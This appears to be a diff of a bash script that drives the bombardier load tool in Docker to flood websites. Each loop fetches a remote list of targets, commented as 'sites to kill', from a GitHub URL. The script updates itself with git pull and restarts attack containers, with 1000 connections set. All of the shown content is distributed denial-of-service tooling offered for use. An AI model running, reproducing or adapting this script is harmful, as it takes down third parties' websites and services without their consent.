@@ -7,10 +7,10 @@ BOMBARDIER_CONNECTIONS=1000
 
 
 
-declare -a sites=($(curl https://raw.githubusercontent.com/alexnest-ua/Updated-bombardier/main/targets))
-
 while :
 do
+  # Taking sites to kill
+  declare -a sites=($(curl https://raw.githubusercontent.com/alexnest-ua/Updated-bombardier/main/targets))
   # Update bomb (take last version from git
   cd ~/Updated-bombardier 
 	num=$(sudo git pull origin main| grep -c "Already")
@@ -29,7 +29,7 @@ do
     
   echo "Kill all useless containers"
 
-  docker kill $(docker ps -aqf ancestor=alpine/bombardier)
+  sudo docker kill $(sudo docker ps -aqf ancestor=alpine/bombardier)
 
   echo "Docker useless containers killed"
 
